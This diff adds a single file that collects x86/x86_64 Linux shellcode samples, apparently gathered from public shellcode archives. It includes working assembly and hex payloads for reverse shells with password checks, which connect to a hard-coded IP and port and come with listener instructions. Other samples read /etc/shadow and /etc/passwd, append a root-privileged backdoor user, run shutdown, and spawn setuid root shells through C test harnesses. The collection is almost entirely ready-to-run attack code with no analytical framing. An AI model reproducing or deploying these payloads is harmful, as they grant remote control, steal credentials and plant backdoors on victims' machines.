@@ -1,0 +1,1053 @@
+•	; SHUTDOWN
+; ===================================================================
+; Optimized version of shellcode at:
+; http://shell-storm.org/shellcode/files/shellcode-877.php
+; Author: SLAE64-1351 (Keyman)
+; Date: 14/09/2014
+;
+; Length: 64 bytes (got shorter by 1 byte :D )
+;
+; What's new is that some optimalization was performed on the
+; original code which left some space to do a basic decoding of the
+; command (/sbin/shutdown). Each byte (except the first one) was
+; decremented by 1. The decoder just adds 1 to each byte.
+;
+; ===================================================================
+ 
+section .text
+global _start
+ 
+_start:
+ 
+xor rax, rax                ; clear rax and rdx
+cdq
+ 
+; -------------------------------------------------------------------
+; 1. store '-h' on stack
+; -------------------------------------------------------------------
+ 
+push rax
+push word 0x682d ;-h
+push rsp
+pop rcx
+ 
+; -------------------------------------------------------------------
+; 2. store 'now' on stack
+; -------------------------------------------------------------------
+ 
+push rax
+push byte 0x77
+push word 0x6f6e ; now
+push rsp
+pop rbx
+ 
+push rax
+push rbx
+push rcx
+ 
+; -------------------------------------------------------------------
+; 3. store '/sbin/shutdown' on stack
+; -------------------------------------------------------------------
+ 
+push rsp
+pop rsi
+ 
+push rax
+jmp shutdown
+cont:
+pop rdi
+ 
+push 15
+pop rcx
+ 
+do_add:
+    add byte [rdi+rcx], 0x01
+    loop do_add
+ 
+push 59
+pop rax
+syscall
+ 
+shutdown:
+    call cont
+    c_1: db 0x2f, 0x2e, 0x2e, 0x72, 0x61, 0x68, 0x6d, 0x2e, 0x72, 0x67, 0x74, 0x73, 0x63, 0x6e, 0x76, 0x6d
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+
+
+;READ PASSWORD
+; ===================================================================
+; Optimized version of shellcode at:
+; http://shell-storm.org/shellcode/files/shellcode-867.php
+; Author: SLAE64-1351 (Keyman)
+; Date: 14/09/2014
+;
+; Length: 105 bytes (got shorter by 13 bytes)
+;
+; What's new is that some optimalization was performed on the
+; original code which left some space to do a basic decoding of the
+; file names. Each byte (except the first one) was xor'ed with the
+; value 0x32. The decoder part xor's each byte (except the first)
+; with this very same value.
+;
+; ===================================================================
+ 
+section .text
+global _start
+ 
+_start:
+        xor rsi, rsi
+        jmp string_1
+cont_1:
+        pop rdi
+ 
+        ; decode
+ 
+        push 24
+        pop rcx
+decode:
+        xor byte [rdi+rcx], 0x32
+        loop decode
+     
+        sub byte [rdi+11], 0x41         ; set last byte to 0x00
+        sub byte [rdi+24], 0x41         ; set last byte to 0x00
+ 
+        ; open (1)
+ 
+        push 2
+        pop rax
+        syscall
+ 
+        push rax
+        pop r14             ; source
+ 
+        ; open (2)
+ 
+        add rdi, 12
+        push 0x66
+        pop rsi
+        push 2
+        pop rax
+        syscall
+ 
+        push rax
+        pop r15             ; destination
+ 
+        ; read
+ 
+        xor rax, rax
+        push r14
+        pop rdi
+        push rsp
+        pop rsi
+        mov dx, 0xFFFF
+        syscall
+ 
+        ; write
+ 
+        push rax
+        pop rdx
+ 
+        push r15
+        pop rdi
+ 
+        push 1
+        pop rax
+        syscall
+ 
+        ; exit
+ 
+        push 60
+        pop rax
+        syscall
+ 
+string_1:
+    call cont_1
+    ; first byte stays the original value
+    s_1: db 0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+
+
+
+;PASSWORD PROTECTED REVERSESHELL
+; ===================================================================
+; Password Protected Reverse Shell
+; Author: SLAE64-1351 (Keyman)
+; Date: 04/09/2014
+;
+; Shellcode length:  136 bytes
+;
+; Description:
+;
+;    Simple reverse shell (listens on port 4444 by default) with
+;    bytes password protection. Using a 4 bytes long password is
+;    still reasonably strong for a single-shot connection and keeps
+;    the code shorter.
+;
+;    To change the port or the password just modify the values of the
+;    exp_port and exp_pass "variables" below.
+;
+;    Before the code gets executed make sure to create a listener:
+;   
+;    nc -lvp <port number>
+;
+;    After you receive the connection you will see no password
+;    prompt. Just type in the 4 bytes long password and hit enter.
+;    If the password matches, you are ready to type OS commands.
+;
+; ===================================================================
+ 
+global _start
+section .text
+ 
+; -------------------------------------------------------------------
+; Preprocessor directives so you can easily change the port and the
+; password.
+; -------------------------------------------------------------------
+ 
+; Host to connect to. Please note that this value will have
+; 0x02020202 added to it, this way avoiding the NULL bytes.
+ 
+%define exp_host    0xFEFDFE7D      ; 127.0.0.1
+ 
+; Port number to listen on.
+%define exp_port        0x5c11          ; 4444
+ 
+; Password to use. Make sure it's not longer than 4 bytes.
+%define exp_pass        0x6c6c6568      ; hell
+ 
+; -------------------------------------------------------------------
+; DO NOT TOUCH
+; preprocessor directives so syscalls can be easily referenced
+; -------------------------------------------------------------------
+ 
+%define sys_connect 42
+%define sys_read     0
+%define sys_execve  59
+%define sys_dup2    33
+ 
+_start:
+ 
+    ; ---------------------------------------------------------------
+    ; START: create socket
+    ; ---------------------------------------------------------------
+      xor rax, rax
+      push rax              ; saving for sockaddr
+      push rax                          ; struct
+      push rax              ; clear rax later
+      push rax              ; set rdx to 0
+      pop rdx               ; protocol
+      mov al, 2
+      push rax
+      push rax
+      pop rsi
+      pop rdi               ; PF_INET
+      shr rsi, 1            ; SOCK_STREAM
+      add al, 39            ; socket syscall (41)
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; START: create struct
+    ;
+    ; srv_addr.sin_family = AF_INET;
+    ; srv_addr.sin_addr.s_addr = INADDR_ANY;
+    ; srv_addr.sin_port = htons(portno);
+    ;
+    ; This is how it looks like on the stack:
+    ; 0x02    0x00    0x11    0x5c    0x7f    0x00    0x00    0x01
+    ; 0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+    ; ---------------------------------------------------------------
+ 
+      ; TODO: have to make this shorter somehow
+      mov byte [rsp], 2                 ; set values
+      mov word [rsp+2], exp_port
+      mov dword [rsp+4], exp_host
+      add dword [rsp+4], 0x02020202
+      push rsp
+      pop rsi                           ; addr of struct in rsi
+ 
+    ; ---------------------------------------------------------------
+    ; START: connect
+    ; ---------------------------------------------------------------
+ 
+                    ; rdx is still 0
+      push rax              ; socket fd
+      pop rdi
+      add dl, 16
+      mov al, sys_connect
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; get passwd
+    ;
+    ; We will work with a 4 byte password, should be more than
+    ; enough as no brute forcing is possible. Chances to guess
+    ; the right value is 0.  Of course passwd should not contain
+    ; null bytes.
+    ;
+    ; n = read(newsockfd,buffer,4);
+    ; ---------------------------------------------------------------
+ 
+      push rax              ; buffer filled with 0s
+      push rsp              ; setup pointer to buf
+      pop rsi
+      sub rdx, 12           ; set bytes to read (4)
+      syscall
+ 
+      ; compare pass received with valid pass and exit if no match
+ 
+      push rax
+      pop rcx
+ 
+      push rdi              ; save socket
+      pop rax
+ 
+      sub rcx, 3            ; read only once
+      push rsp
+      pop rdi
+      push exp_pass
+      push rsp
+      pop rsi
+      cmpsq
+      jne passfail          ; passwd match, give shell
+ 
+shell:
+    ; ---------------------------------------------------------------
+    ; 6. exec shell
+    ; ---------------------------------------------------------------
+ 
+      add cl, 2             ; rcx is 1, so add 2 = 3
+      push rax              ; restore socket
+      pop rdi
+dup_loop:
+      push rcx              ; have to save rcx as dup2
+                    ; changes it's value
+      xor rax, rax
+      sub rcx, 1
+      push rcx
+      pop rsi
+      add al, sys_dup2
+      syscall
+      pop rcx               ; restore the counter
+      loop dup_loop
+ 
+      jmp mytext
+ 
+code:
+      pop rdi
+      mov [rdi+7], BYTE al
+      push rax
+      pop rdx
+      add al, sys_execve
+      syscall
+ 
+mytext:
+    call code
+    MyText: db '/bin/sh', 0x41
+ 
+passfail:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+;read /etc/passwd
+BITS 64
+; Author Mr.Un1k0d3r - RingZer0 Team
+; Read /etc/passwd Linux x86_64 Shellcode
+; Shellcode size 82 bytes
+global _start
+
+section .text
+
+_start:
+jmp _push_filename
+  
+_readfile:
+; syscall open file
+pop rdi ; pop path value
+; NULL byte fix
+xor byte [rdi + 11], 0x41
+  
+xor rax, rax
+add al, 2
+xor rsi, rsi ; set O_RDONLY flag
+syscall
+  
+; syscall read file
+sub sp, 0xfff
+lea rsi, [rsp]
+mov rdi, rax
+xor rdx, rdx
+mov dx, 0xfff; size to read
+xor rax, rax
+syscall
+  
+; syscall write to stdout
+xor rdi, rdi
+add dil, 1 ; set stdout fd = 1
+mov rdx, rax
+xor rax, rax
+add al, 1
+syscall
+  
+; syscall exit
+xor rax, rax
+add al, 60
+syscall
+  
+_push_filename:
+call _readfile
+path: db "/etc/passwdA"
+  
+Shellcode:
+
+\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+; shutdown -h now
+/*
+; Title: shutdown -h now x86_64 Shellcode - 65 bytes
+; Platform: linux/x86_64
+; Date: 2014-06-27
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+section .text
+
+global _start
+
+_start:
+
+xor rax, rax
+xor rdx, rdx 
+
+push rax
+push byte 0x77
+push word 0x6f6e ; now
+mov rbx, rsp
+
+push rax
+push word 0x682d ;-h
+mov rcx, rsp
+
+push rax
+mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
+mov r10, 0x6e776f6474756873
+push r10
+push r8
+mov rdi, rsp
+
+push rdx
+push rbx
+push rcx
+push rdi
+mov rsi, rsp
+
+add rax, 59
+syscall
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
+"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
+"\x50\x66\x68\x2d\x68\x48\x89\xe1"
+"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
+"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
+"\x74\x64\x6f\x77\x6e\x41\x52\x41"
+"\x50\x48\x89\xe7\x52\x53\x51\x57"
+"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
+"\x05";
+
+int
+main() {
+
+printf("Shellcode Length:  %d\n", (int)strlen(code));
+int (*ret)() = (int(*)())code;
+ret();
+
+return 0;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+;TCP REVERSE SHELL WITH PASSWORD
+/*
+; Author Andriy Brukhovetskyy - doomedraven - SLAEx64 1322
+; 138 bytes
+global _start
+section .text
+_start:
+
+   ;socket syscall
+   push byte 0x29 ; 41 socket 
+   pop rax    
+   push byte 0x2 ; AF_INET
+   pop rdi  
+   push byte 0x1 ; SOCK_STREAM
+   pop rsi    
+   cdq ;rdx = 0 - ANY
+   syscall
+   
+   xchg rdi, rax ; save socket descriptor
+   
+   mov dword [rsp-4], 0x0901a8c0 ; ip
+   mov word [rsp-6], 0x5c11      ; port 4444
+   mov byte [rsp-8], 0x02
+   sub rsp, 8
+   
+   push byte 0x2a ; connect
+   pop rax
+   mov rsi, rsp   ; pointer    
+   push byte 0x10 ; len
+   pop rdx
+   syscall
+
+   push byte 0x3; counter 
+   pop rsi
+
+dup2_loop:
+   dec rsi
+   push byte 0x21
+   pop rax
+   syscall
+   jnz dup2_loop ; jump if not 0
+
+   ;read buffer
+   mov rdi, rax ; socket
+   ;xor rax, rax
+   cdq
+   mov byte [rsp-1], al ;0 read
+   sub rsp, 1        
+   push rdx 
+   lea rsi, [rsp-0x10] ; 16 bytes from buf
+   add dl, 0x10        ; size_t count
+   syscall
+   
+   ;test passcode
+   mov rax, 0x617264656d6f6f64 ; passcode 'doomedra'[::-1].encode('hex')
+   push rdi                    ; save the socket
+   lea rdi, [rsi]              ; load string from address
+   scasq                       ; compare
+   jz accepted_passwd          ; jump if equal
+   
+   ;exit if different :P
+   push byte 0x3c 
+   pop rax
+   syscall
+
+accepted_passwd:
+   
+   ;execve
+   pop rdi; socket
+   xor rax, rax
+   mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
+   push rbx
+   mov rdi, rsp
+   push rax
+   mov rdx, rsp
+   push rdi 
+   mov rsi, rsp
+   add al, 0x3b
+   syscall
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+// 138 bytes 
+unsigned char code[] =\
+"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05"
+"\x48\x97\xc7\x44\x24\xfc"
+"\xc0\xa8\x01\x09\x66\xc7\x44\x24\xfa"
+"\x11\x5c" //port big endiant
+"\xc6\x44\x24\xf8\x02\x48\x83"
+"\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f"
+"\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05"
+"\x75\xf6\x48\x89\xc7\x99\x88\x44\x24\xff\x48\x83"
+"\xec\x01\x52\x48\x8d\x74\x24\xf0\x80\xc2\x10\x0f"
+"\x05\x48\xb8\x64\x6f\x6f\x6d\x65\x64\x72\x61\x57"
+"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05"
+"\x5f\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
+"\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48"
+"\x89\xe6\x04\x3b\x0f\x05";
+
+main()
+{
+   printf("Shellcode Length: %d\n", (int)strlen(code));
+   int (*ret)() = (int(*)())code;
+   ret();
+}
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+;Add User with passwd
+;sc_adduser01.S
+;Arch:          x86_64, Linux
+;
+;Author:        0_o -- null_null
+;           nu11.nu11 [at] yahoo.com
+;Date:          2012-03-05
+;
+;compile an executable: nasm -f elf64 sc_adduser.S
+;           ld -o sc_adduser sc_adduser.o
+;compile an object: nasm -o sc_adduser_obj sc_adduser.S
+;
+;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
+;executed syscalls:     setreuid, setregid, open, write, close, exit
+;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
+;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+BITS 64
+[SECTION .text]
+global _start
+_start:
+    ;sys_setreuid(uint ruid, uint euid)
+        xor     rax,    rax
+        mov     al,     113                     ;syscall sys_setreuid
+        xor     rbx,    rbx                     ;arg 1 -- set real uid to root
+        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
+        syscall
+        ;sys_setregid(uint rgid, uint egid)
+        xor     rax,    rax
+        mov     al,     114                     ;syscall sys_setregid
+    xor     rbx,    rbx                     ;arg 1 -- set real uid to root
+        mov     rcx,    rbx                     ;arg 2 -- set effective uid to root
+        syscall
+    ;push all strings on the stack prior to file operations.
+    xor rbx,    rbx
+    mov     ebx,    0x647773FF
+        shr     rbx,    8
+        push    rbx                             ;string \00dws
+        mov     rbx,    0x7361702f6374652f
+        push    rbx                             ;string sap/cte/
+    mov     rbx,    0x0A687361622F6EFF
+        shr     rbx,    8
+        push    rbx                             ;string \00\nhsab/n
+        mov     rbx,    0x69622F3A746F6F72
+        push    rbx                             ;string ib/:toor
+        mov     rbx,    0x2F3A3A303A303A67
+        push    rbx                             ;string /::0:0:g
+    mov rbx,    0x46556B554B587435
+    push    rbx             ;string FUkUKXt5
+    mov rbx,    0x546755333A723074
+    push    rbx             ;string TgU3:r0t
+    ;prelude to doing anything useful...
+    mov rbx,    rsp         ;save stack pointer for later use
+    push    rbp             ;store base pointer to stack so it can be restored later
+    mov rbp,    rsp         ;set base pointer to current stack pointer
+    ;sys_open(char* fname, int flags, int mode)
+    sub rsp,        16
+    mov [rbp - 16], rbx     ;store pointer to "t0r..../bash"
+    mov si,     0x0401      ;arg 2 -- flags
+    mov rdi,        rbx
+    add rdi,        40      ;arg 1 -- pointer to "/etc/passwd"
+    xor rax,        rax
+    mov al,     2       ;syscall sys_open
+    syscall
+    ;sys_write(uint fd, char* buf, uint size)
+    mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.
+    mov rcx,        rbx     ;arg 2 -- load rcx with pointer to string "t0r.../bash"
+    xor rdx,        rdx
+    mov dl,     39      ;arg 3 -- load rdx with size of string "t0r.../bash\00"
+    mov rsi,        rcx     ;arg 2 -- move to source index register
+    mov rdi,        rax     ;arg 1 -- move to destination index register
+    xor     rax,            rax
+        mov     al,             1               ;syscall sys_write
+        syscall
+    ;sys_close(uint fd)
+    xor rdi,        rdi
+    mov edi,        [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register
+    xor rax,        rax
+    mov al,     3       ;syscall sys_close
+    syscall
+    ;sys_exit(int err_code)
+    xor rax,    rax
+    mov al, 60          ;syscall sys_exit
+    xor rbx,    rbx         ;arg 1 -- error code
+    syscall
+;char shellcode[] =
+;   "\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31"
+;   "\xc0\xb0\x72\x48\x31\xdb\x48\x31\xc9\x0f\x05\x48\x31\xdb\xbb"
+;   "\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63"
+;   "\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a"
+;   "\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69"
+;   "\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35"
+;   "\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33"
+;   "\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10"
+;   "\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28"
+;   "\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31"
+;   "\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f"
+;   "\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48"
+;   "\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05";
+;
+;equivalent code:
+;
+;char shellcode[] =
+;   "\x48\x31\xc0\xb0\x71\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31"
+;   "\xc0\xb0\x72\x48\x31\xdb\x48\x89\xd9\x0f\x05\x48\x31\xdb\xbb"
+;   "\xff\x73\x77\x64\x48\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63"
+;   "\x2f\x70\x61\x73\x53\x48\xbb\xff\x6e\x2f\x62\x61\x73\x68\x0a"
+;   "\x48\xc1\xeb\x08\x53\x48\xbb\x72\x6f\x6f\x74\x3a\x2f\x62\x69"
+;   "\x53\x48\xbb\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x53\x48\xbb\x35"
+;   "\x74\x58\x4b\x55\x6b\x55\x46\x53\x48\xbb\x74\x30\x72\x3a\x33"
+;   "\x55\x67\x54\x53\x48\x89\xe3\x55\x48\x89\xe5\x48\x83\xec\x10"
+;   "\x48\x89\x5d\xf0\x66\xbe\x01\x04\x48\x89\xdf\x48\x83\xc7\x28"
+;   "\x48\x31\xc0\xb0\x02\x0f\x05\x89\x45\xfc\x48\x89\xd9\x48\x31"
+;   "\xd2\xb2\x27\x48\x89\xce\x48\x89\xc7\x48\x31\xc0\xb0\x01\x0f"
+;   "\x05\x48\x31\xff\x8b\x7d\xfc\x48\x31\xc0\xb0\x03\x0f\x05\x48"
+;   "\x31\xc0\xb0\x3c\x48\x31\xdb\x0f\x05";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+/*
+;setuid(0) + execve(/bin/sh) - just 4 fun. 
+;xi4oyu [at] 80sec.com
+ 
+main(){
+__asm(  "xorq %rdi,%rdi\n\t"
+        "mov $0x69,%al\n\t"
+        "syscall \n\t"
+        "xorq   %rdx, %rdx \n\t"
+        "movq   $0x68732f6e69622fff,%rbx; \n\t"
+        "shr    $0x8, %rbx; \n\t"
+        "push   %rbx; \n\t"
+        "movq   %rsp,%rdi; \n\t"
+        "xorq   %rax,%rax; \n\t"
+        "pushq  %rax; \n\t"
+        "pushq  %rdi; \n\t"
+        "movq   %rsp,%rsi; \n\t"
+        "mov    $0x3b,%al; \n\t"
+        "syscall ; \n\t"
+        "pushq  $0x1 ; \n\t"
+        "pop    %rdi ; \n\t"
+        "pushq  $0x3c ; \n\t"
+        "pop    %rax ; \n\t"
+        "syscall  ; \n\t"
+);
+}
+*/
+main() {
+        char shellcode[] =
+        "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
+        "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
+        "\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
+        "\x58\x0f\x05";
+        (*(void (*)()) shellcode)();
+}
+ 
+2009-05-14
+evil.xi4oyu 
+
+
+
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+/*
+
+Title   : Obfuscated execve /bin/sh (30 bytes)
+Date    : 3rd July 2013
+Author  : Russell Willis <codinguy@gmail.com>
+System  : Linux/x86 (SMP Debian 3.2.41-2 i686)
+  
+To build:
+gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+
+00000000  31C9              xor ecx,ecx
+00000002  F7E9              imul ecx
+00000004  51                push ecx
+00000005  040B              add al,0xb
+00000007  EB08              jmp short 0x11
+00000009  5E                pop esi
+0000000A  87E6              xchg esp,esi
+0000000C  99                cdq
+0000000D  87DC              xchg ebx,esp
+0000000F  CD80              int 0x80
+00000011  E8F3FFFFFF        call dword 0x9
+00000016  2F                das
+00000017  62696E            bound ebp,[ecx+0x6e]
+0000001A  2F                das
+0000001B  2F                das
+0000001C  7368              jnc 0x86
+
+*/
+
+#include <stdio.h>
+ 
+unsigned char code[] = \
+"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
+"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
+ 
+main()
+{
+    printf("Shellcode Length: %d\n", sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+
+
+
+
+
+
+
+
+
+
+============================================================================================================================================================================
+****************************************************************************************************************************************************************************
+============================================================================================================================================================================
+
+/*
+ * (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 
+ * - 37 bytes
+ * - xgc@gotfault.net
+ *
+ */
+
+char shellcode[] =
+
+  "\x6a\x17"			// push	$0x17
+  "\x58"			// pop 	%eax
+  "\x31\xdb"			// xor	%ebx, %ebx
+  "\xcd\x80"			// int	$0x80
+
+  "\x6a\x2e"			// push	$0x2e	
+  "\x58"			// pop	%eax
+  "\x53"			// push %ebx
+  "\xcd\x80"			// int	$0x80
+
+  "\x31\xd2"			// xor	%edx, %edx
+  "\x6a\x0b"			// push	$0xb
+  "\x58"			// pop	%eax
+  "\x52"			// push	%edx
+  "\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
+  "\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
+  "\x89\xe3"			// mov	%esp, %ebx
+  "\x52"			// push	%edx
+  "\x53"			// push	%ebx
+  "\x89\xe1"			// mov	%esp, %ecx
+  "\xcd\x80";			// int	$0x80
+ 
+int main() {
+ 
+	int (*f)() = (int(*)())shellcode;
+    printf("Length: %u\n", strlen(shellcode));
+    f();
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
